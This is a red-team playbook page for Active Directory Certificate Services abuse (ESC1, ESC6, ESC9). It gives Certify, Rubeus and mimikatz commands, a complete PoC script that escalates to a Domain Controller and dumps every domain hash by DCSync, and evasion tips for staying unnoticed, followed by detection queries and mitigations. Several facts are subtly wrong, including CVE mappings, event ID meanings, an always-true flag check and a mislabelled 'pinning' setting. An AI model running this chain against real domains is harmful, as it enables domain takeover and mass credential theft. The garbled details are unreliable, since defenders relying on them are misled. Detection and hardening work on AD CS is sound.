# [PE-ELEVATE-001]: Active Directory Certificate Services (AD CS) Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-001 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows Active Directory (On-Premises, Hybrid) |
| **Severity** | Critical |
| **CVE** | CVE-2021-27239 (ESC1-11 variants), CVE-2022-26923 (Certifried), CVE-2020-1472 (ZeroLogon related) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Server 2008 R2 - 2025 (depends on template misconfiguration and patch status) |
| **Patched In** | Depends on specific ESC variant; May 2022 (KB5012170) addresses some ESC variants, but misconfigured templates persist |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

Active Directory Certificate Services (AD CS) is Microsoft's public key infrastructure (PKI) service used for digital certificate issuance and management. Attackers exploit misconfigured certificate templates to obtain certificates with arbitrary Subject Alternative Names (SANs), enabling them to impersonate any user or computer in the domain—including Domain Controllers. A low-privileged user can request a certificate for the Domain Controller's computer account (DC$) using the DC's dNSHostName as a SAN, then use this certificate to perform Kerberos PKINIT authentication as the DC, ultimately gaining domain admin privileges via DCSync attacks. The vulnerability chain (ESC1-ESC11) encompasses multiple template misconfigurations and CA policy flaws, all stemming from insufficient validation of certificate request attributes and weak access controls on enrollment templates.

### Attack Surface

**Primary Surface:** Certificate templates with dangerous flags (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, CT_FLAG_NO_SECURITY_EXTENSION), low-privileged enrollment permissions (Everyone, Authenticated Users), and inadequate attribute validation.

**Secondary Surface:** Certification Authority (CA) settings (EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag), template msPKI-Enrollment-Flag settings, and insufficient approval workflows.

### Business Impact

**Immediate Consequences:** Complete domain compromise via DCSync attack (all password hashes exfiltrated), persistence as Domain Controller account, ability to forge Kerberos tickets (golden tickets), lateral movement to all domain resources, and ransomware deployment across entire domain.

**Long-Term Risk:** Attackers with domain controller certificate can maintain persistent access indefinitely, forge tickets for any user, and hide within normal Kerberos traffic.

### Technical Context

AD CS attacks require on-premises Active Directory access or hybrid environment with Azure AD Connect. Exploitation typically takes 2-5 minutes once template misconfiguration is identified. Certificate-based authentication leaves fewer indicators than traditional credential attacks—tools like `certutil` don't log commands by default, and certificate requests can be hidden in normal CA traffic. Reversibility is low: removing vulnerable templates requires understanding enterprise certificate workflows and may break legitimate services.

### Operational Risk

- **Execution Risk:** Low (if vulnerable template exists; just requires user enrollment access).
- **Stealth:** Medium (certificate requests are logged in CA audit logs, but rarely monitored).
- **Reversibility:** Low (requires template recreation and application reconfiguration).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark v8** | CA-6, CA-7 | Certificate management and revocation controls |
| **DISA STIG** | SC-12, SC-13 | Cryptographic controls; certificate and key management |
| **CISA SCuBA** | Cryptographic Key Management | PKI and certificate security baselines |
| **NIST 800-53** | SC-12, SC-13, SI-7 | Cryptographic key management; integrity verification |
| **GDPR** | Art. 32 | Security of processing; cryptographic controls |
| **DORA** | Art. 9 | ICT risk management; cryptographic security |
| **NIS2** | Art. 21, Art. 27 | Cyber security measures; incident reporting |
| **ISO 27001** | A.10.1, A.14.1 | Cryptographic controls; information security |
| **ISO 27005** | Risk Scenario | Certificate infrastructure compromise enabling domain takeover |

---

## 2. AD CS VULNERABILITY LANDSCAPE (ESC1-ESC11 OVERVIEW)

### ESC1: Overly Permissive Template + SAN Abuse

**Vulnerability:** Certificate template allows low-privileged users to enroll and permits supplying arbitrary Subject Alternative Names (SANs).

**Dangerous Flags:**
- `msPKI-Certificate-Name-Flag = 1` (allows SAN)
- `msPKI-Enrollment-Flag = 0` (no manager approval)
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set

**Affected Versions:** Server 2008 R2 - 2025

**Mitigation:** Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag; require manager approval.

### ESC2: "Swiss Army Knife" Certificate

**Vulnerability:** Template allows "Any Purpose" EKU (Extended Key Usage), enabling certificate to be used for any purpose including domain authentication.

**Dangerous Flag:**
- `szOID_ENHANCED_KEY_USAGE_ANY` = Any Purpose

**Affected Versions:** Server 2008 R2 - 2025

### ESC3: Misconfigured Enrollment Agents

**Vulnerability:** Enrollment Agent template combined with overly permissive Agent certificate allows arbitrary user impersonation.

### ESC4: Permission-Based Template Modification

**Vulnerability:** Low-privileged users have WRITE permissions on template objects, allowing them to modify msPKI flags directly.

### ESC5: Overly Permissive CA Permissions

**Vulnerability:** Non-admin users have FullControl permission on CA object, allowing them to configure EDITF flags or modify approval policies.

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Registry Flag

**Vulnerability:** Registry flag on CA allows ANY certificate request to include arbitrary SANs without template controls.

**Registry Key:** `HKLM\System\CurrentControlSet\Services\CertSvc\Configuration\[CA-Name]\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`

**Flag Value:** 0x10000000 = EDITF_ATTRIBUTESUBJECTALTNAME2 enabled

### ESC9: No Security Extension

**Vulnerability:** Template lacks security extension (CT_FLAG_NO_SECURITY_EXTENSION), bypassing security checks during issuance.

### ESC10: Weak Security Descriptor on CA

**Vulnerability:** Certificate Authority object has overly permissive security descriptor (Everyone has READ/WRITE permissions).

### ESC11: Data Obfuscation via Subject RDN Abuse

**Vulnerability:** Attackers use malformed Subject RDN to bypass attribute validation.

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance - Identify Vulnerable Templates

#### Step 1: Enumerate Certificate Templates

```powershell
# Connect to AD Certificate Services
$forestRoot = (Get-ADForest).RootDomain
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Configuration,$((Get-ADRootDSE).configurationNamingContext)")
$searcher.Filter = "(objectClass=pKICertificateTemplate)"

$templates = @()
$searcher.FindAll() | ForEach-Object {
  $templates += @{
    Name = $_.Properties["cn"][0]
    DisplayName = $_.Properties["displayName"][0]
    OID = $_.Properties["pKIDefaultCSPs"][0]
    EKU = $_.Properties["pKIExtendedKeyUsage"]
  }
}

$templates | Select-Object Name, DisplayName | Format-Table -AutoSize
```

**What to Look For:**
- Templates with generic names ("User", "Machine", "Computer", "WebServer")
- Templates that aren't used by legitimate services (check with CA team)
- Templates with unusual Extended Key Usage (EKU) values

#### Step 2: Check Dangerous Template Flags

```powershell
# Query template attributes that indicate vulnerability
$searchRoot = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)

$searcher.FindAll() | ForEach-Object {
  $name = $_.Properties["name"][0]
  $flags = $_.Properties["msPKI-Certificate-Name-Flag"][0]
  $enrollFlags = $_.Properties["msPKI-Enrollment-Flag"][0]
  
  # Check for dangerous flags
  if (($flags -band 1) -eq 1) {  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
    Write-Host "⚠️  VULNERABLE: $name allows enrollee to supply subject (SAN abuse possible)"
  }
  
  if (($enrollFlags -band 0x00000000) -eq 0) {  # No manager approval required
    Write-Host "⚠️  VULNERABLE: $name requires no manager approval"
  }
}
```

**Expected Output (If Vulnerable):**
```
⚠️  VULNERABLE: User allows enrollee to supply subject (SAN abuse possible)
⚠️  VULNERABLE: User requires no manager approval
```

#### Step 3: Check CA Registry for EDITF_ATTRIBUTESUBJECTALTNAME2

```powershell
# Connect to CA server
$caServer = "ca-server.domain.com"
$caName = "CA-Name"  # Usually the CA's short name

# Query registry for ESC6 vulnerability
$regPath = "HKLM\System\CurrentControlSet\Services\CertSvc\Configuration\$caName\PolicyModules"
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $caServer)
$key = $reg.OpenSubKey($regPath)
$value = $key.GetValue("CertificateAuthority_MicrosoftDefault.Policy")

if ($value -band 0x10000000) {
  Write-Host "⚠️  ESC6 VULNERABLE: EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on CA"
} else {
  Write-Host "✓ CA is hardened against ESC6"
}
```

**What This Means:**
- If flag is enabled, any certificate request can include arbitrary SANs
- Attackers can request DC certificate without template vulnerability

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: ESC1 Exploitation - SAN Abuse via Vulnerable Template

**Supported Versions:** Server 2008 R2 - 2025

#### Step 1: Identify Enrollment-Capable User

**Objective:** Confirm current user can enroll in vulnerable template.

```powershell
# Check permissions on vulnerable template (example: "User" template)
$templateName = "User"
$searchRoot = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)
$searcher.Filter = "(name=$templateName)"
$template = $searcher.FindOne()

# Check if current user can enroll
$acl = New-Object System.DirectoryServices.ActiveDirectoryAccessRule
$template | Get-Acl | Select-Object -ExpandProperty Access | 
  Where-Object { $_.IdentityReference -match "Authenticated Users|Domain Users|Everyone" }
```

**What to Look For:**
- "Authenticated Users" with "Enroll" or "FullControl" permissions
- "Everyone" with enrollment permissions (extremely vulnerable)

#### Step 2: Use Certify.exe to List Vulnerable Templates

**Objective:** Automated template vulnerability scanning.

```powershell
# Download and run Certify.exe
# GitHub: https://github.com/Flangvik/Certify

.\Certify.exe find /vulnerable /ca:ca-server\ca-name

# Output example:
# [!] Vulnerable Certificates Templates :
# [!] Template Name                             : User
# [!] Schema Version                            : 2
# [!] Enroll Permissions                        : Domain Users
# [!] msPKI-Certificate-Name-Flag               : ENROLLEE_SUPPLIES_SUBJECT
# [!] msPKI-Enrollment-Flag                     : NONE (Allows enrollment without manager approval)
```

**What This Detects:**
- Templates where low-privileged users can enroll
- Templates with ENROLLEE_SUPPLIES_SUBJECT flag
- Templates without manager approval requirements

#### Step 3: Request Certificate with DC SAN

**Objective:** Request certificate as Domain Controller using impersonation.

**Command (Certify.exe - Request DC Certificate):**
```powershell
# Request certificate with Domain Controller as Subject/SAN
.\Certify.exe request /ca:ca-server\ca-name /template:User /altname:DC-NAME$ 

# Output:
# [+] Certificate Request Submitted (Request ID: 123)
# [+] Certificate Authority approved request
# [+] Certificate issued!
# [+] Certificate saved to: C:\Users\attacker\Documents\cert.pfx
```

**What This Means:**
- Certificate now contains dNSHostName = DC-NAME (attacker can impersonate DC)
- Certificate includes attacker's identity as Subject
- Next step: use certificate for Kerberos PKINIT authentication

**OpSec & Evasion:**
- Use generic template names ("User", "Machine") instead of suspicious templates
- Request during business hours when CA traffic is normal
- Space out certificate requests (don't request 10 DC certs in 1 minute)
- Delete certificate files after conversion to PFX (clean up artifacts)

#### Step 4: Convert Certificate to Usable Format (PFX)

**Objective:** Convert issued certificate to format accepted by Kerberos tools.

**Command (OpenSSL or Certutil):**
```powershell
# Export certificate with private key (if possible via CA web interface)
# Otherwise, use Rubeus to request TGT directly from .pfx

# Or: Use OpenSSL to convert if certificate was saved in DER format
openssl pkcs12 -export -in cert.cer -inkey privkey.pem -out cert.pfx -passout pass:password

# Verify certificate contains correct SANs
openssl x509 -in cert.cer -text -noout | grep -A 5 "Subject Alternative Name"
```

**Expected Output:**
```
X509v3 Subject Alternative Name:
    DNS:DC-NAME, DNS:DC-NAME.domain.com, DNS:DC-NAME$
```

#### Step 5: Use Certificate for Kerberos PKINIT Authentication

**Objective:** Authenticate as Domain Controller using the certificate.

**Command (Rubeus - Request TGT as DC):**
```powershell
# Download Rubeus: https://github.com/GhostPack/Rubeus

.\Rubeus.exe asktgt /user:DC-NAME$ /certificate:C:\Users\attacker\cert.pfx `
  /password:password /dc:domain-controller-ip /pkinit

# Output:
# [*] Valid TGT with start time: 1/9/2025 10:00:00 AM
# [*] This TGT expires: 1/9/2025 8:00:00 PM
# [+] Ticket successfully imported to current session
```

**What This Means:**
- Attacker now has TGT (Ticket Granting Ticket) as Domain Controller account
- Can now perform Kerberos ticket operations (TGS requests, delegation, etc.)
- Next step: use DC ticket to perform DCSync and extract all domain credentials

**Troubleshooting:**
- **Error:** `No certificate found matching subject`
  - **Cause:** Certificate file path incorrect or certificate not properly formatted
  - **Fix:** Verify certificate path and format (PFX vs DER vs PEM)

- **Error:** `PKINIT pre-authentication failed`
  - **Cause:** Certificate SAN doesn't match DC hostname exactly
  - **Fix:** Re-check certificate SANs; they must exactly match DC's dNSHostName

#### Step 6: Execute DCSync Attack Using DC Certificate

**Objective:** Extract all domain user password hashes using DCSync.

**Command (Mimikatz - DCSync via Certificate):**
```powershell
# First, import certificate-obtained TGT
.\Rubeus.exe asktgt /user:DC-NAME$ /certificate:cert.pfx /password:password

# Then, use DCSync to extract hashes
.\mimikatz.exe "lsadump::dcsync /domain:domain.com /all /csv" exit

# Output:
# Domain : domain.com
# ObjectGuid : {GUID}
# invocationId : {GUID}
# [*] Dumping Domain Credentials (domain\username:hash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

**What This Means:**
- All domain user password hashes now extracted
- Attacker can crack hashes offline or use Pass-the-Hash (PTH)
- Domain is fully compromised

---

### METHOD 2: ESC6 Exploitation - Registry-Based SAN Bypass (No Template Modification Required)

**Supported Versions:** Server 2008 R2 - 2022 (depends on CA registry settings)

#### Step 1: Verify CA Has EDITF Flag Enabled

**Objective:** Confirm ESC6 vulnerability exists on CA.

**Command (PowerShell Remote):**
```powershell
$caServer = "ca-server.domain.com"
$caName = "CA-Name"

# Query CA registry for ESC6 flag
Invoke-Command -ComputerName $caServer -ScriptBlock {
  param($caName)
  $regPath = "HKLM:\System\CurrentControlSet\Services\CertSvc\Configuration\$caName\PolicyModules"
  $reg = Get-ItemProperty $regPath -Name "CertificateAuthority_MicrosoftDefault.Policy" -ErrorAction SilentlyContinue
  
  if ($reg) {
    $flags = $reg."CertificateAuthority_MicrosoftDefault.Policy"
    if ($flags -band 0x10000000) {
      Write-Host "✓ ESC6 VULNERABLE: EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled"
    }
  }
} -ArgumentList $caName
```

#### Step 2: Request Any Certificate and Abuse EDITF Flag

**Objective:** Request certificate with arbitrary SAN using ANY template (ESC6 bypasses template controls).

**Command (Certify.exe with ESC6):**
```powershell
# With ESC6 enabled, ANY template can include arbitrary SANs
# Request using User template but supply DC SAN via EDITF bypass

.\Certify.exe request /ca:ca-server\ca-name /template:User /altname:DC-NAME$

# CA processes request and applies EDITF flag, accepting SAN regardless of template settings
```

**What This Means:**
- ESC6 completely bypasses template-level controls
- Any low-privileged user can obtain admin certificate
- Extremely dangerous vulnerability

---

### METHOD 3: ESC9 Exploitation - No Security Extension Bypass

**Supported Versions:** Server 2008 R2 - 2022

#### Step 1: Identify Template Lacking Security Extension

**Objective:** Find template with CT_FLAG_NO_SECURITY_EXTENSION set.

```powershell
# Query template for missing security extension
$searchRoot = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)
$searcher.Filter = "(name=*)"

$searcher.FindAll() | ForEach-Object {
  $flags = $_.Properties["msPKI-Certificate-Name-Flag"][0]
  
  # CT_FLAG_NO_SECURITY_EXTENSION = 0x00800000
  if (($flags -band 0x00800000) -eq 0x00800000) {
    Write-Host "⚠️  VULNERABLE: $($_.Properties['name'][0]) has NO_SECURITY_EXTENSION flag"
  }
}
```

#### Step 2: Request Certificate via ESC9 Template

**Objective:** Bypass security checks by using template without security extension.

```powershell
# Request certificate using ESC9 template
# Attacker can supply arbitrary attributes without validation

.\Certify.exe request /ca:ca-server\ca-name /template:ESC9Template /altname:DC-NAME$ /encode:true
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Complete ESC1 Attack Chain - PoC

```powershell
# Full ESC1 exploitation script
param(
  [string]$CaServer = "ca-server",
  [string]$CaName = "CA-Name",
  [string]$TargetDC = "DC01",
  [string]$VulnerableTemplate = "User"
)

Write-Host "[*] Starting ESC1 exploitation..."

# 1. Request certificate with DC SAN
Write-Host "[+] Step 1: Requesting certificate for $TargetDC via $VulnerableTemplate template"
.\Certify.exe request /ca:$CaServer\$CaName /template:$VulnerableTemplate /altname:"$TargetDC`$"

# 2. Convert to PFX
Write-Host "[+] Step 2: Converting certificate to PFX format"
$certPath = "C:\Users\$env:USERNAME\Documents\cert.pfx"

# 3. Request TGT as DC using certificate
Write-Host "[+] Step 3: Requesting TGT as $TargetDC using certificate"
.\Rubeus.exe asktgt /user:"$TargetDC`$" /certificate:$certPath /password:password /dc:$TargetDC /pkinit

# 4. Execute DCSync
Write-Host "[+] Step 4: Executing DCSync to extract domain hashes"
.\mimikatz.exe "lsadump::dcsync /domain:domain.com /all /csv" exit

Write-Host "[✓] ESC1 exploitation complete. All domain hashes extracted."
```

**Expected Timeline:**
- Certificate request: 30 seconds
- PKINIT authentication: 15 seconds
- DCSync execution: 60 seconds
- **Total time to domain compromise: ~2 minutes**

---

## 6. TOOLS & COMMANDS REFERENCE

### Certify.exe - Certificate Template Enumeration & Exploitation

**GitHub:** https://github.com/Flangvik/Certify

**Version:** 1.0+

**Installation:**
```powershell
# Download binary from GitHub releases
Invoke-WebRequest -Uri "https://github.com/Flangvik/Certify/releases/download/v1.0/Certify.exe" `
  -OutFile "C:\Tools\Certify.exe"
```

**Key Commands:**
```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable /ca:ca-server\ca-name

# Request certificate
.\Certify.exe request /ca:ca-server\ca-name /template:User /altname:DC-NAME$

# Check template details
.\Certify.exe find /template:User
```

### Certipy - Python-based AD CS Exploitation

**GitHub:** https://github.com/ly4k/Certipy

**Installation (Linux):**
```bash
pip install certipy-ad
```

**Key Commands:**
```bash
# Enumerate templates
certipy-ad find -u user@domain -p password -dc-ip 192.168.1.x

# Request certificate
certipy-ad req -u user@domain -p password -ca CA-NAME -template User -dc-ip 192.168.1.x

# Authenticate using certificate
certipy-ad auth -pfx cert.pfx -dc-ip 192.168.1.x
```

### Rubeus - Kerberos Exploitation

**GitHub:** https://github.com/GhostPack/Rubeus

**Key Commands:**
```powershell
# Request TGT using certificate
.\Rubeus.exe asktgt /user:DC-NAME$ /certificate:cert.pfx /password:password /pkinit

# Request TGS (service ticket)
.\Rubeus.exe asktgs /ticket:base64-tgt /service:krbtgt/domain.com /dc-ip:192.168.1.x
```

### Mimikatz - Credential Extraction & DCSync

**GitHub:** https://github.com/gentilkiwi/mimikatz

**Key Commands:**
```
lsadump::dcsync /domain:domain.com /all /csv
kerberos::pkinit /pfx:cert.pfx /password:password /user:DC-NAME$
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Certificate Request (ESC1-ESC9)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4888 (Certificate Issued), TargetUserName, SubjectAltNames
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** All AD environments with AD CS deployed

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4888  // Certificate issued
| where Computer has "$"  // Computer accounts (DC$, SERVER$, etc.)
| project TimeGenerated, Computer, SubjectAltNames, TargetUserName, EventData
| where SubjectAltNames contains "DC" or SubjectAltNames contains "$"
| summarize IssuanceCount=count() by Computer, SubjectAltNames, bin(TimeGenerated, 5m)
| where IssuanceCount > 1  // Alert if multiple certs for same computer in 5m
```

**What This Detects:**
- Certificate requests for domain computers (DC$, SERVER$)
- Multiple certificates for the same computer (persistence indicator)
- Certificates with computer account SANs

### Query 2: CA Registry Modifications (ESC6 Vulnerability Creation)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4657 (Registry value modified), ObjectName, NewValue
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** CA servers

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4657  // Registry modification
| where ObjectName contains "HKLM\\System\\CurrentControlSet\\Services\\CertSvc"
| where ObjectName contains "EDITF"
| project TimeGenerated, Computer, SubjectUserName, ObjectName, NewValue, OldValue
```

**What This Detects:**
- Modifications to EDITF flags enabling ESC6 vulnerability
- Unauthorized CA policy changes

### Query 3: Kerberos PKINIT Authentication (Certificate-Based Auth)

**Rule Configuration:**
- **Required Table:** SecurityEvent
| **Required Fields:** EventID 4768 (Kerberos TGT Request), PreAuthType
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To:** All domain controllers

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768  // Kerberos TGT requested
| where PreAuthType == "PKInit"  // PKINIT (certificate-based)
| where TargetUserName endswith "$"  // Computer account
| project TimeGenerated, TargetUserName, ClientAddress, PKInitType
| where TargetUserName == "DC01$"  // Alert if DC$ account
```

**What This Detects:**
- Kerberos authentication using certificates (PKINIT)
- Certificate-based authentication for computer/DC accounts (unusual pattern)

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4886 (Certificate Request Submitted)**
- **Log Source:** Security (Certificate Services audit)
- **Trigger:** New certificate request submitted to CA
- **Filter:** Look for requests with RequestAttributes containing "Subject Alternative Name" or "DNSHostName"
- **Applies To Versions:** Server 2008 R2+

**Event ID: 4887 (Certificate Issued)**
- **Log Source:** Security (Certificate Services audit)
- **Trigger:** Certificate issued by CA
- **Filter:** Look for issued certificates where Subject contains "$" (computer account)
- **Applies To Versions:** Server 2008 R2+

**Event ID: 4888 (Certificate Request Denied)**
- **Log Source:** Security
- **Trigger:** CA rejected certificate request
- **Filter:** Track denied requests—attacker might retry multiple times
- **Applies To Versions:** Server 2008 R2+

**Manual Configuration Steps (Group Policy):**
1. On **Certification Authority server**, open **Event Viewer** → **Windows Logs** → **Security**
2. Right-click **Security** → **Filter Current Log**
3. **Event IDs:** 4886, 4887, 4888
4. Apply filter
5. Enable auditing via **Local Security Policy** (secpol.msc):
   - **Security Settings** → **Advanced Audit Configuration** → **System Audit Policies**
   - Enable: **Audit Certificate Service Issuance** (Success and Failure)
   - Enable: **Audit Certificate Service Administrative Actions** (Success and Failure)

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Unified Audit Log captures M365/Azure activity, not on-premises AD CS events. For on-premises AD CS, rely on Windows Event Logs (Section 8).

If AD CS is integrated with Azure AD (e.g., federated authentication), monitor:

```powershell
Connect-ExchangeOnline

Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -Operations "Modify AD Federation Service properties", "Update certificate", "Issue certificate" `
  -ResultSize 5000 |
  Export-Csv -Path "C:\Audit\ADCS_Azure_Integration.csv"
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Remove Dangerous Flags from Certificate Templates**

Objective: Disable ESC1, ESC2, ESC9 vulnerabilities at the template level.

**Manual Steps (Certificate Authority Console):**
1. Open **Certification Authority** (certlm.msc) on CA server
2. Expand **Certificate Templates**
3. Right-click vulnerable template (e.g., "User") → **Properties**
4. Go to **Subject Name** tab
5. Uncheck: **"Include e-mail name in subject alternate name"**
6. Uncheck: **"Allow Subject Name in Request"** (removes CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
7. Go to **Extensions** tab
8. Ensure **Application Policies** includes only appropriate EKU (NOT "Any Purpose")
9. Click **OK** → **Yes** to update template

**Manual Steps (PowerShell - Template Flag Modification):**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$template = Get-ADObject -Identity $templateDN -Properties *

# Remove dangerous flags
# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
# CT_FLAG_NO_SECURITY_EXTENSION = 0x00800000

$newFlags = $template."msPKI-Certificate-Name-Flag" -band -bnot 0x00000001  # Remove ENROLLEE_SUPPLIES_SUBJECT
$newFlags = $newFlags -band -bnot 0x00800000  # Remove NO_SECURITY_EXTENSION

Set-ADObject -Identity $templateDN -Replace @{"msPKI-Certificate-Name-Flag" = $newFlags}

Write-Host "✓ Dangerous flags removed from template"
```

**Verification Command:**
```powershell
# Verify flags are set correctly
$template = Get-ADObject -Identity $templateDN -Properties "msPKI-Certificate-Name-Flag"
$flags = $template."msPKI-Certificate-Name-Flag"

if (($flags -band 0x00000001) -eq 0) {
  Write-Host "✓ PASS: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is disabled"
}
```

---

**Mitigation 2: Disable ESC6 Flag on Certification Authority**

Objective: Disable EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag.

**Manual Steps (PowerShell Remote):**
```powershell
$caServer = "ca-server.domain.com"
$caName = "CA-Name"

Invoke-Command -ComputerName $caServer -ScriptBlock {
  param($caName)
  
  # Stop Certificate Services
  Stop-Service -Name CertSvc -Force
  
  # Modify registry
  $regPath = "HKLM:\System\CurrentControlSet\Services\CertSvc\Configuration\$caName\PolicyModules"
  $policyValue = Get-ItemProperty $regPath -Name "CertificateAuthority_MicrosoftDefault.Policy"
  $flags = $policyValue."CertificateAuthority_MicrosoftDefault.Policy"
  
  # Remove EDITF_ATTRIBUTESUBJECTALTNAME2 (0x10000000)
  $newFlags = $flags -band -bnot 0x10000000
  
  Set-ItemProperty $regPath -Name "CertificateAuthority_MicrosoftDefault.Policy" -Value $newFlags
  
  # Restart Certificate Services
  Start-Service -Name CertSvc
  
  Write-Host "✓ EDITF flag removed from CA"
} -ArgumentList $caName
```

**Verification Command:**
```powershell
Invoke-Command -ComputerName $caServer -ScriptBlock {
  param($caName)
  $regPath = "HKLM:\System\CurrentControlSet\Services\CertSvc\Configuration\$caName\PolicyModules"
  $policyValue = Get-ItemProperty $regPath
  $flags = $policyValue."CertificateAuthority_MicrosoftDefault.Policy"
  
  if (($flags -band 0x10000000) -eq 0) {
    Write-Host "✓ PASS: EDITF_ATTRIBUTESUBJECTALTNAME2 is disabled"
  }
}
```

---

**Mitigation 3: Restrict Certificate Enrollment Permissions**

Objective: Remove low-privileged users' ability to enroll in sensitive templates.

**Manual Steps (Certificate Authority Console):**
1. Open **Certification Authority** (certlm.msc)
2. Right-click vulnerable template → **Properties**
3. Go to **Security** tab
4. Select "**Authenticated Users**" or "**Everyone**"
5. Click **Remove**
6. Click **Add** → type "Domain Admins" → Click **OK**
7. Assign only "Read" and "Enroll" permissions to Domain Admins
8. Click **Apply** → **OK**

**Manual Steps (PowerShell - Modify Template ACL):**
```powershell
$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"

# Remove "Authenticated Users" enrollment permission
$acl = Get-Acl -Path "AD:\$templateDN"
$acl.Access | Where-Object { $_.IdentityReference -like "*Authenticated Users*" } | ForEach-Object {
  $acl.RemoveAccessRule($_)
}

# Add only Domain Admins
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  ([System.Security.Principal.SecurityIdentifier]"S-1-5-21-*-512"),  # Domain Admins SID
  [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
  [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($rule)

Set-Acl -Path "AD:\$templateDN" -AclObject $acl

Write-Host "✓ Enrollment permissions restricted"
```

---

### Priority 2: HIGH

**Mitigation 4: Require Manager Approval for Certificate Requests**

Objective: Prevent automatic certificate issuance; require approval step.

**Manual Steps (Certificate Authority Console):**
1. Open CA console → Right-click template → **Properties**
2. Go to **Issuance Requirements** tab
3. Check: **"This number of authorized signatures"** → set to **1**
4. Click **Add** → select manager account
5. Click **OK**

This forces certificate requests to require manager approval before issuance.

---

**Mitigation 5: Implement Certificate Pinning for Critical Services**

Objective: Force services to use only certificates signed by specific CAs, preventing rogue certificate abuse.

**Manual Steps (Kerberos PKINIT Hardening):**
```powershell
# Configure domain controller to only trust specific certificate CAs for PKINIT
# Set registry on DC: HKLM\System\CurrentControlSet\Services\Kdc
# KdcUseRequestedEtypes = 1 (forces encryption type negotiation, preventing downgrade)

Invoke-Command -ComputerName DC01 -ScriptBlock {
  Set-ItemProperty "HKLM:\System\CurrentControlSet\Services\Kdc" -Name "KdcUseRequestedEtypes" -Value 1
}
```

---

### Validation Command (Verify Mitigations)

```powershell
Write-Host "=== AD CS Security Audit ==="

# 1. Check for vulnerable template flags
$vulnerable = @()
$searchRoot = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)
$searcher.FindAll() | ForEach-Object {
  $name = $_.Properties["name"][0]
  $flags = $_.Properties["msPKI-Certificate-Name-Flag"][0]
  
  if (($flags -band 0x00000001) -eq 0x00000001) {
    $vulnerable += $name
  }
}

if ($vulnerable.Count -eq 0) {
  Write-Host "✓ PASS: No templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT found"
} else {
  Write-Host "✗ FAIL: Found vulnerable templates: $($vulnerable -join ', ')"
}

# 2. Check CA registry for ESC6
$regPath = "HKLM\System\CurrentControlSet\Services\CertSvc\Configuration\*\PolicyModules"
$regValue = Get-ItemProperty $regPath -Name "*EDITF*" -ErrorAction SilentlyContinue

if (-not $regValue) {
  Write-Host "✓ PASS: No EDITF flags found on CA"
} else {
  Write-Host "✗ FAIL: EDITF flags detected on CA"
}
```

